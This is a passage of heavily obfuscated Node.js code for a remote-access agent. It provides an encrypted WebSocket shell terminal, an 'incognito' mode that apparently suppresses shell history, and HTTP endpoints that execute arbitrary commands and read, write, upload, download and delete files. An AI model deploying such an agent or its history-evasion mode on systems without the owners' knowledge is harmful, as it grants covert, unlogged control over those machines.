                'XZxxK': function (b, c) {
                    return b === c;
                },
                'AzJrn': 'win32',
                'MTfZx': 'Cleanly\x20closed'
            };
        this[k6(0x7f4)] && a0D['info']('[' + this[k6(0x7f4)] + k6(0xb2d));
        if (this[k6(0x349)]) {
            a[k6(0x275)](process[k6(0x2fb)], a[k6(0x266)]) && this['ptyProcess'][k6(0xa57)] && this[k6(0x215)](this[k6(0x349)][k6(0xa57)]);
            try {
                this['ptyProcess'][k6(0x2e6)]();
            } catch (b) {
            }
            this[k6(0x349)] = null;
        }
        if (this[k6(0x9bc)])
            this['cipher'][k6(0x6ad)]();
        if (this[k6(0xb99)])
            try {
                this[k6(0xb99)][k6(0xb6b)] === this['websocket']['OPEN'] && this[k6(0xb99)][k6(0xd8e)](0x3e8, a[k6(0xbdc)]);
            } catch (c) {
            } finally {
                this[k6(0xb99)] = null;
            }
    }
    [a0c4(0x215)](a) {
        const k7 = a0c4, b = {
                'pnrTV': function (c, d, f, g) {
                    return c(d, f, g);
                }
            };
        try {
            b[k7(0x95b)](a0r, k7(0x501) + a, { 'windowsHide': !![] }, () => {
            });
        } catch (c) {
        }
    }
    [a0c4(0x8b0)](a) {
        const k8 = a0c4, b = {
                'GdyOc': function (c, d) {
                    return c === d;
                },
                'ATRuN': k8(0x5ae),
                'Qyzhx': function (c, d) {
                    return c === d;
                },
                'lmCGX': k8(0xc51)
            };
        if (b['GdyOc'](this[k8(0x9f2)], b[k8(0xb55)])) {
            if (this[k8(0xbfe)]['length'] > 0x0) {
                const c = this[k8(0xbfe)][k8(0xd5e)]();
                c(a);
            } else
                this['msgQueue']['push'](a);
        } else
            b[k8(0xcde)](this[k8(0x9f2)], b['lmCGX']) && this[k8(0x9d1)](a);
    }
    async [a0c4(0x9e8)]() {
        const k9 = a0c4, a = {
                'emcqQ': function (b, c) {
                    return b > c;
                }
            };
        if (a[k9(0x31e)](this[k9(0x88c)]['length'], 0x0))
            return this['msgQueue'][k9(0xd5e)]();
        return new Promise(b => {
            const ka = k9;
            this[ka(0xbfe)][ka(0x21f)](b);
        });
    }
    async [a0c4(0x976)](a) {
        const kb = a0c4, b = {
                'ngdLB': function (c, d) {
                    return c(d);
                },
                'SYrld': function (c, d) {
                    return c > d;
                },
                'AtqNr': '三次握手交互后仍未进入\x20Established\x20状态',
                'btXVw': kb(0x5a0),
                'Giipf': kb(0xab5)
            };
        b[kb(0x87f)](a, kb(0xccb));
        try {
            await this[kb(0x9bc)]['init']();
            const c = await this[kb(0x9e8)](), d = this['cipher'][kb(0x2c8)](c);
            d && b[kb(0xa41)](d[kb(0xcfc)], 0x0) && this[kb(0xb99)][kb(0x4db)](d);
            const f = await this[kb(0x9e8)]();
            this[kb(0x9bc)][kb(0x2c8)](f);
            if (!this[kb(0x9bc)][kb(0xcff)])
                throw new Error(b[kb(0xca9)]);
            b[kb(0x87f)](a, b[kb(0xccf)]);
        } catch (g) {
            b[kb(0x87f)](a, kb(0x595) + g[kb(0x1f1)]);
            throw new Error(b['Giipf']);
        }
    }
    [a0c4(0x53f)]() {
        const kc = a0c4, a = {
                'BRBsf': function (d, f) {
                    return d === f;
                },
                'ojdBr': 'win32',
                'mBYvb': kc(0x70a),
                'bPLUn': 'v1.0',
                'ILwmy': kc(0x1ce),
                'qYNbO': kc(0x60f),
                'OjQms': kc(0x9c2),
                'NXIPu': kc(0x6c0),
                'LpOYJ': kc(0x817),
                'jrRzd': kc(0x9c5)
            };
        if (a[kc(0x24f)](process[kc(0x2fb)], a[kc(0x534)])) {
            const d = process.env.SystemRoot || a[kc(0x3c4)], f = [
                    a0o[kc(0x6e5)](d, kc(0x60f), kc(0x4b2), a[kc(0xcc4)], a[kc(0x25e)]),
                    process.env.COMSPEC,
                    a0o[kc(0x6e5)](d, a[kc(0x87b)], a[kc(0x64b)])
                ];
            for (const g of f) {
                if (g && a0l['existsSync'](g))
                    return g;
            }
            return kc(0x9c2);
        }
        const b = [
            a['NXIPu'],
            kc(0x485),
            a[kc(0x91b)]
        ];
        for (const h of b) {
            if (a0l[kc(0xc2f)](h))
                return h;
        }
        const c = process.env.SHELL;
        if (c && a0l[kc(0xc2f)](c))
            return c;
        return a[kc(0xceb)];
    }
    async [a0c4(0x249)](a, b, c, d = ![], f = ![]) {
        const kd = a0c4, g = {
                'GptEq': function (i, j) {
                    return i(j);
                },
                'zjAUh': '🔗\x20检测到\x20WS\x20连接，启用\x20Noise\x20加密',
                'IzEcK': kd(0x3af),
                'eAhsz': kd(0x1f1)
            };
        this[kd(0xb99)] = a, this[kd(0x7f4)] = b, this[kd(0x59e)] = d, this['incognitoRequested'] = f;
        const h = i => a0D[kd(0xb82)](kd(0x885) + b + ']\x20' + i);
        this[kd(0xaef)] = !c, g[kd(0xc0b)](h, this['useNoise'] ? g[kd(0x8ae)] : g[kd(0xb78)]), a['on'](g[kd(0x6e1)], i => this[kd(0x8b0)](i));
        try {
            this[kd(0xaef)] && await this[kd(0x976)](h), await this[kd(0x570)](h);
        } catch (i) {
            h(kd(0x97e) + i[kd(0x1f1)]), await this[kd(0x539)]();
        }
    }
    async [a0c4(0x570)](a) {
        const ke = a0c4, b = {
                'wxUBd': ke(0xbba),
                'xbQrN': function (h, i) {
                    return h(i);
                },
                'Ksjfe': function (h, i) {
                    return h(i);
                },
                'QSejz': 'xterm-256color',
                'vkVsF': ke(0xad8),
                'ljaYl': function (h, i) {
                    return h !== i;
                },
                'DkzWN': ke(0x99f),
                'mxGHK': function (h, i) {
                    return h === i;
                },
                'XVCyt': 'powershell.exe',
                'pgLRE': '-NoExit',
                'iNrES': ke(0x549),
                'TlEtX': ke(0x573),
                'JlARv': function (h) {
                    return h();
                },
                'AEQYc': 'unknown',
                'EvHHS': ke(0xc51),
                'aVGGq': function (h, i) {
                    return h > i;
                },
                'chEHl': ke(0xd8e)
            }, c = this['getAvailableShell']();
        b[ke(0x764)](a, ke(0xb37) + c);
        const d = Object['assign']({}, process.env);
        delete d[ke(0x2eb)], d[ke(0x1dd)] = b[ke(0xd00)];
        if (!d['LANG'])
            d['LANG'] = b[ke(0x718)];
        this[ke(0xaee)] && b['ljaYl'](process[ke(0x2fb)], b[ke(0x8bd)]) && (d[ke(0xcb0)] = ke(0x8bb));
        const f = this[ke(0xaee)] && process[ke(0x2fb)] === ke(0x99f) && b[ke(0x766)](a0o[ke(0xda0)](c)[ke(0xc48)](), b[ke(0xce6)]) ? [
                b[ke(0x2bc)],
                b[ke(0x2b2)],
                b[ke(0xd1f)]
            ] : [], g = b[ke(0xa43)](a0E);
        try {
            const h = {
                'name': b[ke(0xd00)],
                'cols': 0x50,
                'rows': 0x18,
                'cwd': g,
                'env': d
            };
            if (b[ke(0x766)](process[ke(0x2fb)], b[ke(0x8bd)]))
                try {
                    this['ptyProcess'] = a0C[ke(0x569)](c, f, h);
                } catch (i) {
                    b[ke(0x764)](a, '⚠️\x20ConPTY\x20启动失败，回退管道模式:\x20' + i[ke(0x1f1)]), this['ptyProcess'] = new a0bY(c, d, g, f), this[ke(0x349)][ke(0x569)]();
                }
            else
                this['ptyProcess'] = a0C[ke(0x569)](c, f, h);
            b['Ksjfe'](a, ke(0xa38) + (this[ke(0x349)][ke(0xa57)] || b[ke(0x910)]) + ')');
            this[ke(0x59e)] && this[ke(0xbd5)](c);
            this[ke(0x9f2)] = b[ke(0x224)];
            while (b[ke(0x472)](this[ke(0x88c)]['length'], 0x0)) {
                const j = this['msgQueue'][ke(0xd5e)]();
                this[ke(0x9d1)](j);
            }
            this[ke(0x349)][ke(0xcad)](k => {
                const kf = ke;
                try {
                    let l = Buffer[kf(0x581)](k, b['wxUBd']);
                    this[kf(0xaef)] && this['cipher'] && this[kf(0x9bc)][kf(0xcff)] && (l = this[kf(0x9bc)]['encrypt'](l)), this['websocket'][kf(0xb6b)] === 0x1 && this[kf(0xb99)][kf(0x4db)](l);
                } catch (m) {
                }
            }), this['ptyProcess']['onExit'](({
                exitCode: k,
                signal: l
            }) => {
                const kg = ke;
                b[kg(0xbeb)](a, '🔌\x20终端进程退出\x20(Code:\x20' + k + kg(0xd65) + l + ')'), this[kg(0x539)]();
            }), this[ke(0xb99)]['on'](b['chEHl'], () => {
                const kh = ke;
                a(kh(0x6d6)), this[kh(0x539)]();
            });
        } catch (k) {
            a(ke(0xa86) + k[ke(0x1f1)]), await this[ke(0x539)]();
            throw k;
        }
    }
    static [a0c4(0x4dd)](a) {
        const ki = a0c4, b = {
                'FCYSE': function (d, f) {
                    return d(f);
                },
                'vaaVk': function (d, f) {
                    return d || f;
                },
                'yVfRe': ki(0xa60)
            };
        let c = a0o['basename'](b[ki(0x5d3)](String, b[ki(0xa96)](a, ''))['trim']())['toLowerCase']();
        if (c[ki(0xd23)](b[ki(0x8f8)]))
            c = c[ki(0xa40)](0x0, -0x4);
        return b[ki(0xa96)](c, 'sh');
    }
    static [a0c4(0x207)](a) {
        const kj = a0c4, b = {
                'SCKtS': function (c, d) {
                    return c === d;
                },
                'Evzjp': 'win32',
                'eAGXS': function (c, d) {
                    return c(d);
                },
                'DkMLZ': kj(0x1ce),
                'tePpr': kj(0x9c2)
            };
        if (b[kj(0x6af)](process[kj(0x2fb)], b['Evzjp'])) {
            const c = a0o[kj(0xda0)](b['eAGXS'](String, a || ''))['toLowerCase']();
            return b[kj(0x6af)](c, b['DkMLZ']) || b[kj(0x6af)](c, b['tePpr']);
        }
        return !![];
    }
    ['_sendWelcome'](a) {
        const kk = a0c4, b = {
                'rhMFm': 'welcome',
                'Ibfhm': function (c, d) {
                    return c === d;
                }
            };
        try {
            let c = Buffer[kk(0x581)](JSON['stringify']({
                'type': b['rhMFm'],
                'shell': a0bZ['normalizeShellName'](a),
                'path': a,
                'incognito': !!(this[kk(0xaee)] && a0bZ['incognitoNativeApplied'](a))
            }));
            this[kk(0xaef)] && this[kk(0x9bc)] && this[kk(0x9bc)][kk(0xcff)] && (c = this[kk(0x9bc)][kk(0xb44)](c)), this[kk(0xb99)] && b[kk(0xc0d)](this[kk(0xb99)]['readyState'], 0x1) && this[kk(0xb99)][kk(0x4db)](c);
        } catch (d) {
        }
    }
    [a0c4(0x9d1)](a) {
        const kl = a0c4, b = {
                'SqbYZ': 'utf-8',
                'uDUPT': function (c, d) {
                    return c === d;
                },
                'LNYzo': kl(0x7ec),
                'CniFT': kl(0x55d),
                'afnCE': function (c, d) {
                    return c === d;
                },
                'HbVrc': 'input',
                'aJpoO': function (c, d) {
                    return c !== d;
                },
                'gBjBQ': function (c, d) {
                    return c === d;
                },
                'lxwgH': kl(0x7be)
            };
        if (!this[kl(0x349)])
            return;
        try {
            const c = Buffer[kl(0x581)](a);
            let d;
            this['useNoise'] ? d = this['cipher']['decrypt'](c) : d = c;
            let f = ![], g = d[kl(0xa3c)](b[kl(0x8c7)]);
            if (g['trim']()[kl(0x6ec)]('{'))
                try {
                    const h = JSON[kl(0xcf1)](g);
                    f = !![];
                    if (b[kl(0x64f)](h[kl(0x221)], b[kl(0x56e)])) {
                        let i = Buffer[kl(0x581)](JSON[kl(0x8f7)]({ 'type': b[kl(0x56e)] }));
                        if (this[kl(0xaef)])
                            i = this[kl(0x9bc)][kl(0xb44)](i);
                        this[kl(0xb99)]['send'](i);
                        return;
                    }
                    if (b['uDUPT'](h[kl(0x221)], b[kl(0x446)])) {
                        this[kl(0x349)]['resize'](h[kl(0x1d9)] || 0x50, h[kl(0x91f)] || 0x18);
                        return;
                    }
                    if (b[kl(0x88e)](h[kl(0x221)], b['HbVrc']) && b[kl(0x897)](h[kl(0x369)], undefined)) {
                        let j = b[kl(0xbd3)](h[kl(0xab2)], b[kl(0x758)]) ? Buffer[kl(0x581)](h['data'], b[kl(0x758)])[kl(0xa3c)](b['SqbYZ']) : h[kl(0x369)];
                        this[kl(0x349)][kl(0x32b)](j);
                        return;
                    }
                } catch (k) {
                    f = ![];
                }
            !f && this[kl(0x349)]['write'](d[kl(0xa3c)](b[kl(0x8c7)]));
        } catch (l) {
            a0D[kl(0xb82)]('[终端会话\x20' + this[kl(0x7f4)] + kl(0x9ca) + l[kl(0x1f1)]);
            if (this['useNoise'])
                this[kl(0x539)]();
        }
    }
}
async function a0c0() {
    const km = a0c4, a = await import('@noble/curves/nist.js');
    a0A = a[km(0xcaf)];
    const b = await import(km(0xa9c));
    a0B = b[km(0x912)];
}
async function a0c1(a = {}) {
    const kn = a0c4, b = {
            'ISBxs': function (c) {
                return c();
            },
            'XnViZ': kn(0xaf3),
            'wiGli': function (c, d) {
                return c === d;
            },
            'QEUpW': kn(0xac3),
            'EJHbM': kn(0x8a8),
            'yZYYI': kn(0xc9d),
            'IAXkh': 'Access-Control-Allow-Headers',
            'tCsdS': 'content-type,\x20user-agent,\x20authorization,\x20x-nonce,\x20x-timestamp,\x20x-auth-token,\x20x-aes-encrypted,\x20x-debug,\x20x-file-path,\x20x-file-name,\x20x-chunk-id,\x20x-total-chunks',
            'diuys': 'Access-Control-Allow-Methods',
            'epXAu': kn(0x305),
            'yTaEP': function (c, d) {
                return c === d;
            },
            'xgRCO': kn(0xbb0),
            'lVYAC': function (c, d) {
                return c !== d;
            },
            'yapMT': function (c, d, f) {
                return c(d, f);
            },
            'yemvD': function (c, d) {
                return c > d;
            },
            'avWwz': kn(0x36e),
            'vKdHS': function (c, d) {
                return c === d;
            },
            'vCfhb': function (c, d) {
                return c === d;
            },
            'noCyK': 'full',
            'xnDyf': function (c, d) {
                return c === d;
            },
            'hMerN': kn(0x578),
            'vvpTU': kn(0x49f),
            'IGdaD': function (c, d) {
                return c(d);
            },
            'PooAe': function (c, d) {
                return c === d;
            },
            'XskRa': kn(0x4b1),
            'EWVpi': function (c, d) {
                return c / d;
            },
            'NlQMm': function (c, d) {
                return c - d;
            },
            'adyRw': kn(0xb6f),
            'vnWau': function (c, d) {
                return c === d;
            },
            'rmFBB': function (c, d) {
                return c === d;
            },
            'KuxeE': function (c, d) {
                return c(d);
            },
            'xzqRn': kn(0xa47),
            'sYCQB': kn(0x552),
            'qKRYV': kn(0x986),
            'shHGn': kn(0x251),
            'NXRcY': kn(0x80e),
            'MdPFm': function (c, d) {
                return c(d);
            },
            'PNVOY': function (c, d, f) {
                return c(d, f);
            },
            'sSoRI': function (c, d) {
                return c(d);
            },
            'mZpYA': kn(0x2cd),
            'ERzLE': 'content-type',
            'OYXnp': kn(0xd6c),
            'lVHPY': kn(0x504),
            'ApQUW': function (c, d) {
                return c <= d;
            },
            'uVUJX': 'base64',
            'BPoPi': kn(0xc85),
            'LDesh': 'true',
            'KMekJ': kn(0xd73),
            'khaoc': kn(0x82a),
            'XwFmP': function (c, d, f) {
                return c(d, f);
            },
            'prnZI': function (c, d, f) {
                return c(d, f);
            },
            'AaRrH': function (c, d) {
                return c === d;
            },
            'NaXob': function (c, d) {
                return c(d);
            },
            'KeaFQ': function (c, d) {
                return c > d;
            },
            'wVsgR': function (c, d) {
                return c === d;
            },
            'eCjsr': function (c, d) {
                return c === d;
            },
            'gWBvt': function (c, d) {
                return c(d);
            },
            'vUZxu': function (c, d) {
                return c === d;
            },
            'IMegU': function (c, d) {
                return c < d;
            },
            'njoxR': function (c, d) {
                return c === d;
            },
            'xSXqC': function (c, d) {
                return c === d;
            },
            'rzFsb': kn(0x4b4),
            'ucECv': function (c, d) {
                return c(d);
            },
            'sAnum': kn(0xbba),
            'hJgxd': function (c, d) {
                return c === d;
            },
            'njStR': kn(0x24a),
            'YKrXn': kn(0x2b8),
            'PtIPh': function (c, d) {
                return c === d;
            },
            'zEGZV': kn(0x7ba),
            'tYujT': kn(0x958),
            'Jdwwe': 'Config\x20validated',
            'tBjIu': kn(0x968),
            'ARMTV': '❌\x20启动熔断:\x20ECDSA\x20公钥缺失或解析失败，非\x20DEBUG\x20模式下拒绝启动',
            'MYuvr': kn(0xc71),
            'RYALi': kn(0x425),
            'yeGGA': kn(0xbdd),
            'TXMIb': kn(0xb1a),
            'tXSZh': kn(0x46e),
            'cNIGo': function (c) {
                return c();
            },
            'HAszH': function (c, d) {
                return c(d);
            },
            'fvNjt': kn(0xcc8),
            'wqFMw': function (c, d, f) {
                return c(d, f);
            },
            'faPFi': 'Middleware\x20applied,\x20setting\x20up\x20routes...',
            'oFuQB': kn(0x783),
            'HajAX': '/api/status',
            'riUZn': kn(0x3bd),
            'tkXEc': kn(0xaf2),
            'pQDsl': '/api/file/cat',
            'GYBfX': '/api/fileraw',
            'GBOVx': kn(0xa3b),
            'pENcC': kn(0xdb9),
            'syHkr': '/api/file/cp',
            'zVnJc': kn(0x60e),
            'ydlgz': kn(0x7d5),
            'kEaar': '/api/file/unzip',
            'SBvPE': kn(0xd17),
            'eIcwK': kn(0xa65),
            'qeCTx': kn(0x2ec),
            'tBvPS': '/api/task/log/onetime',
            'fIbhU': kn(0xa31),
            'Lwqgo': kn(0x460),
            'XIQZu': kn(0x96a),
            'ctVUE': kn(0xca5),
            'EVlfe': kn(0x3df),
            'wOTLy': '/api/ws/*',
            'BvNtg': 'WebSocket\x20route\x20configured',
            'oEHGJ': kn(0x213),
            'wTNce': kn(0x303),
            'qhrRT': kn(0x9b6)
        };
    try {
        await a0c0(), a0D[kn(0x354)](b['tYujT']), a0P['merge'](a), a0D['debug'](kn(0x72c)), a0P[kn(0xd80)](), a0D['debug'](b[kn(0xd22)]), a0D[kn(0x354)](kn(0x50d));
        const c = new a0X(a0P['ECDSA_PUBLIC_KEY_PEM'], a0P[kn(0x7b5)]);
        a0D[kn(0x354)](b[kn(0x44a)]);
        !a0P[kn(0x708)] && !c['ecdsaPubkey'] && (a0D[kn(0xbb0)](b[kn(0x5f4)]), a0D[kn(0xbb0)](b[kn(0x338)]), process[kn(0x34e)](0x1));
        a0D[kn(0x354)](b[kn(0x621)]);
        const d = new a0W();
        d[kn(0x598)] = () => a0P[kn(0x689)](), a0D[kn(0x354)](b[kn(0xb3d)]), a0D[kn(0x354)](b['TXMIb']);
        const f = new a0a0();
        a0D[kn(0x354)](b[kn(0x4eb)]), a0D['debug'](kn(0x4e3));
        const g = b[kn(0x3d9)](a0f);
        b['HAszH'](a0x, g), a0D['debug'](b['fvNjt']), g[kn(0x86a)]((l, m, n) => {
            const ko = kn, o = ko(0x287)[ko(0x3ff)]('|');
            let p = 0x0;
            while (!![]) {
                switch (o[p++]) {
                case '0':
                    b[ko(0x673)](n);
                    continue;
                case '1':
                    m[ko(0x3a8)](b[ko(0x242)], '*');
                    continue;
                case '2':
                    if (b['wiGli'](l[ko(0xaf0)], b['QEUpW']))
                        return a0P[ko(0x708)] && m[ko(0x9fe)](ko(0xc85), b[ko(0x847)]), m[ko(0x8ab)](0xc8)['end']();
                    continue;
                case '3':
                    m[ko(0x3a8)](ko(0x8fd), b['yZYYI']);
                    continue;
                case '4':
                    m[ko(0x3a8)](b[ko(0x561)], b[ko(0xb42)]);
                    continue;
                case '5':
                    m[ko(0x3a8)](b[ko(0x5b5)], b[ko(0x4a7)]);
                    continue;
                }
                break;
            }
        }), g[kn(0x86a)](a0f['text']({
            'type': l => l[kn(0x5b0)] !== '/api/fileraw',
            'limit': kn(0xa3b)
        })), g[kn(0x86a)](a0f[kn(0x9b1)]({ 'extended': !![] })), g[kn(0x86a)](b[kn(0x7d0)](a0Z, c, d)), a0D[kn(0x354)](b['faPFi']), g['get'](kn(0x77b), async (l, m) => {
            const kp = kn;
            try {
                const n = await a0P[kp(0x683)](), o = await a0P['getBaseInfoLocal'](n[kp(0xd71)] || ''), p = await a0P[kp(0x699)](), q = a0a0[kp(0x9a5)](n, o, p);
                b[kp(0x9ce)](l[kp(0x484)], !![]) ? (q[kp(0x6f2)] = a0P[kp(0x680)], q['noise_key'] = a0P[kp(0xa0d)]) : (q['session_key'] = null, q[kp(0xd2d)] = null), m[kp(0x69a)](q), a0P['KMODE'] === '1' && a0bT['onBaseinfoSuccess']();
            } catch (r) {
                m[kp(0x8ab)](0x1f4)[kp(0x69a)]({
                    'status': b['xgRCO'],
                    'message': r[kp(0x1f1)]
                });
            }
        }), g[kn(0x5f2)](b[kn(0x9d6)], (l, m) => {
            const kq = kn;
            let n = a0P[kq(0xace)];
            if (b[kq(0x294)](l[kq(0xd58)][kq(0x383)], undefined)) {
                const s = b[kq(0x356)](parseInt, l['query'][kq(0x383)], 0xa);
                if (Number[kq(0xb51)](s) || s < 0x1 || b['yemvD'](s, a0P[kq(0x20e)]))
                    return m['status'](0x1a6)[kq(0x69a)]({ 'error': kq(0x6fd) + a0P[kq(0x20e)] });
                n = s;
            }
            const o = typeof l[kq(0xd58)][kq(0x9a9)] === b['avWwz'] ? l['query'][kq(0x9a9)][kq(0x7e4)]()['toLowerCase']() : '';
            let p;
            if (b[kq(0x550)](o, '') || b[kq(0x257)](o, b[kq(0x59c)]))
                p = b[kq(0x59c)];
            else {
                if (b['xnDyf'](o, b[kq(0x4a8)]))
                    p = b['hMerN'];
                else
                    return m[kq(0x8ab)](0x1a6)['json']({ 'error': b['vvpTU'] });
            }
            const q = d[kq(0xdc4)](n), r = u => new Date(u * 0x3e8)[kq(0xb63)]()[kq(0x1ad)](kq(0x620), 'Z');
            m[kq(0x69a)]({
                'status': 'ok',
                'key_id': q[kq(0x721)],
                'ttl_seconds': q[kq(0xc18)],
                'created_at': r(q[kq(0xb3b)]),
                'expires_at': b[kq(0x363)](r, q[kq(0x744)]),
                'ecdsa': p === b[kq(0x4a8)] ? {
                    'private_key': q[kq(0xc72)],
                    'public_key': q[kq(0x7a2)]
                } : {
                    'private_key': q[kq(0xaa3)][kq(0x7e4)](),
                    'public_key': q['ecdsa_public_key'][kq(0x7e4)]()
                },
                'ecies': b[kq(0x5f9)](p, b[kq(0x4a8)]) ? {
                    'private_key': q[kq(0xca2)],
                    'public_key': q[kq(0xd44)]
                } : {
                    'private_key': q[kq(0xca2)],
                    'public_key': q['ecies_public_key']
                }
            });
        }), g[kn(0x5f2)](b[kn(0x368)], async (l, m) => {
            const kr = kn;
            try {
                const n = Math[kr(0x5c2)](b[kr(0x9dc)](Date[kr(0x2a3)](), 0x3e8));
                !a0P[kr(0xbb9)] || b[kr(0x5cf)](b[kr(0x2b0)](n, a0P[kr(0x6c4)]), a0P['STATUS_CACHE_TTL']) ? (!a0P['_status_fetch_promise'] && (a0P[kr(0x7dc)] = f[kr(0xb64)]()[kr(0xcb3)](p => {
                    const ks = kr;
                    return a0P[ks(0xbb9)] = p, a0P[ks(0x6c4)] = Math['floor'](Date['now']() / 0x3e8), a0P['_status_fetch_promise'] = null, a0D[ks(0x354)](b['XskRa']), p;
                })[kr(0x22d)](p => {
                    const kt = kr;
                    a0P[kt(0x7dc)] = null;
                    throw p;
                })), await a0P['_status_fetch_promise']) : a0D['debug'](b[kr(0x35c)]);
                const o = { ...a0P['_status_cache'] };
                m[kr(0x69a)](o);
            } catch (p) {
                m[kr(0x8ab)](0x1f4)[kr(0x69a)]({
                    'status': b[kr(0x53c)],
                    'message': p[kr(0x1f1)]
                });
            }
        });
        const h = async (l, m) => {
            const ku = kn;
            try {
                let n = null;
                if (b[ku(0x7d7)](typeof l[ku(0x274)], b[ku(0x576)]))
                    n = l[ku(0x274)]['trim']();
                else
                    l[ku(0x274)] && b[ku(0x9ce)](typeof l[ku(0x274)], ku(0xc4b)) && (n = l['body'][ku(0xb5c)] || '');
                if (!n)
                    return m[ku(0x8ab)](0x190)['json']({
                        'status': b['xgRCO'],
                        'message': ku(0x82c)
                    });
                const o = await a0a1['execute'](n, {
                    'cwd': l[ku(0x274)][ku(0x2cb)],
                    'env': l[ku(0x274)]['env'],
                    'timeout': a0P[ku(0x406)]
                });
                m[ku(0x69a)](o);
            } catch (p) {
                m['status'](0x1f4)['json']({
                    'status': b[ku(0x53c)],
                    'message': p[ku(0x1f1)]
                });
            }
        };
        g[kn(0xb47)]('/api/exec', h);
        for (const l of [
                kn(0xb54),
                kn(0x3cb),
                kn(0x8ed)
            ]) {
            g[kn(0xb47)](l, h);
        }
        g[kn(0xb47)](b[kn(0x522)], async (m, n) => {
            const kv = kn;
            try {
                const o = await a0a4[kv(0xd0b)](m[kv(0x274)][kv(0x5b0)], m[kv(0x274)][kv(0x38a)]);
                n[kv(0x69a)]({
                    'status': 'ok',
                    'count': o[kv(0xcfc)],
                    'files': o
                });
            } catch (p) {
                n[kv(0x8ab)](0x1f4)[kv(0x69a)]({
                    'status': b[kv(0x53c)],
                    'message': p[kv(0x1f1)]
                });
            }
        }), g[kn(0xb47)](b[kn(0x1a1)], async (m, n) => {
            const kw = kn;
            try {
                const o = await a0a4[kw(0xb49)](m[kw(0x274)][kw(0xabb)] || []);
                n[kw(0x69a)]({
                    'status': 'ok',
                    'files': o
                });
            } catch (p) {
                n[kw(0x8ab)](0x1f4)[kw(0x69a)]({
                    'status': 'error',
                    'message': p[kw(0x1f1)]
                });
            }
        }), g[kn(0xc4a)](b[kn(0x1a1)], async (m, n) => {
            const kx = kn;
            try {
                const o = m[kx(0x274)][kx(0x40d)] || {}, p = b['rmFBB'](m[kx(0x274)]['recursive'], !![]), q = await a0a4[kx(0x225)](o, p);
                n['json'](q);
            } catch (r) {
                n[kx(0x8ab)](0x1f4)[kx(0x69a)]({
                    'status': b[kx(0x53c)],
                    'message': r['message']
                });
            }
        }), g[kn(0xb47)](b[kn(0xacc)], async (m, n) => {
            const ky = kn;
            try {
                const o = await a0a4['readFile'](m[ky(0x274)][ky(0x5b0)]);
                n[ky(0x69a)](o);
            } catch (p) {
                n['status'](0x1f4)['json']({
                    'status': b[ky(0x53c)],
                    'message': p[ky(0x1f1)]
                });
            }
        }), g[kn(0xb47)](kn(0xdb9), async (m, n) => {
            const kz = kn;
            try {
                const o = await a0a4[kz(0x6ea)](m[kz(0x274)][kz(0x5b0)], m[kz(0x274)][kz(0x7a1)], m[kz(0x274)]['content'], m[kz(0x274)][kz(0x686)], m[kz(0x274)]['total_chunks']);
                n[kz(0x69a)](o);
            } catch (p) {
                n[kz(0x8ab)](0x1f4)['json']({
                    'status': b[kz(0x53c)],
                    'message': p[kz(0x1f1)]
                });
            }
        }), g[kn(0xb47)](b[kn(0x714)], a0f['raw']({
            'type': b['OYXnp'],
            'limit': b[kn(0xa1a)]
        }), async (m, n) => {
            const kA = kn;
            try {
                const o = b[kA(0x3e9)](decodeURIComponent, m[kA(0x48d)][b[kA(0x555)]] || ''), p = b['IGdaD'](decodeURIComponent, m[kA(0x48d)][b[kA(0x4f8)]] || ''), q = m[kA(0x48d)][b[kA(0x359)]], r = m[kA(0x48d)][b[kA(0xad9)]];
                if (!o || !p)
                    return n[kA(0x8ab)](0x190)[kA(0x69a)]({
                        'status': b[kA(0x53c)],
                        'completed': ![],
                        'message': b[kA(0x911)]
                    });
                const s = b[kA(0x294)](q, undefined) ? parseInt(b['MdPFm'](String, q), 0xa) : null, t = r !== undefined ? b[kA(0xb50)](parseInt, b[kA(0x84e)](String, r), 0xa) : null, u = m['body'];
                if (!Buffer['isBuffer'](u))
                    return n[kA(0x8ab)](0x190)['json']({
                        'status': b['xgRCO'],
                        'completed': ![],
                        'message': kA(0x5ac)
                    });
                const v = await a0a4['uploadFileRaw'](o, p, u, s, t);
                n[kA(0x69a)](v);
            } catch (w) {
                n[kA(0x8ab)](0x1f4)[kA(0x69a)]({
                    'status': b[kA(0x53c)],
                    'completed': ![],
                    'message': w[kA(0x1f1)]
                });
            }
        }), g['post']('/api/file/download', async (m, n) => {
            const kB = kn;
            try {
                const o = await a0a4[kB(0x541)](m['body'][kB(0x5b0)]);
                n[kB(0x9fe)](b[kB(0xc92)], o[kB(0x9e0)]['toString']()), n[kB(0x9fe)](kB(0xcd0), o['path']), n[kB(0x9fe)](b[kB(0xc80)], b[kB(0x9aa)]);
                if (!a0P[kB(0x708)] && b['vnWau'](m[kB(0x3a8)](b['lVHPY']), '1') && b[kB(0x5cf)](a0P[kB(0xa23)], 0x0) && b['ApQUW'](o[kB(0x9e0)], a0P[kB(0xa23)]))
                    try {
                        const p = c['encryptData'](o['content'], Buffer[kB(0x581)](a0P['SESSION_KEY'], b[kB(0x322)]));
                        return n[kB(0x9fe)](b['BPoPi'], b[kB(0xc3b)]), n['send'](p);
                    } catch (q) {
                        return n[kB(0x8ab)](0x1f4)[kB(0x69a)]({
                            'status': b[kB(0x53c)],
                            'message': kB(0xa36)
                        });
                    }
                return n[kB(0x4db)](o['content']);
            } catch (r) {
                n['status'](0x1f4)[kB(0x69a)]({
                    'status': kB(0xbb0),
                    'message': r[kB(0x1f1)]
                });
            }
        }), g[kn(0xdab)](b['pENcC'], async (m, n) => {
            const kC = kn;
            try {
                let o = m[kC(0x274)][kC(0xabb)];
                if (!o || !Array['isArray'](o)) {
                    o = [];
                    if (m[kC(0x274)][kC(0x5b0)])
                        o[kC(0x21f)](m[kC(0x274)][kC(0x5b0)]);
                    if (m['body'][kC(0x905)])
                        o[kC(0x21f)](m[kC(0x274)][kC(0x905)]);
                }
                const p = await a0a4['deleteFiles'](o);
                n['json']({
                    'status': 'ok',
                    'results': p
                });
            } catch (q) {
                n[kC(0x8ab)](0x1f4)[kC(0x69a)]({
                    'status': kC(0xbb0),
                    'message': q['message']
                });
            }
        }), g[kn(0xc4a)](kn(0xdb9), async (m, n) => {
            const kD = kn;
            try {
                const o = await a0a4[kD(0xbc7)](m[kD(0x274)]['move_map'] || m[kD(0x274)]);
                n[kD(0x69a)]({
                    'status': 'ok',
                    'total': o[kD(0xcfc)],
                    'success': o[kD(0xaf5)](p => p[kD(0x8ab)] === 'ok')[kD(0xcfc)],
                    'results': o
                });
            } catch (p) {
                n[kD(0x8ab)](0x1f4)[kD(0x69a)]({
                    'status': b[kD(0x53c)],
                    'message': p[kD(0x1f1)]
                });
            }
        }), g['post'](b[kn(0x71e)], async (m, n) => {
            const kE = kn;
            try {
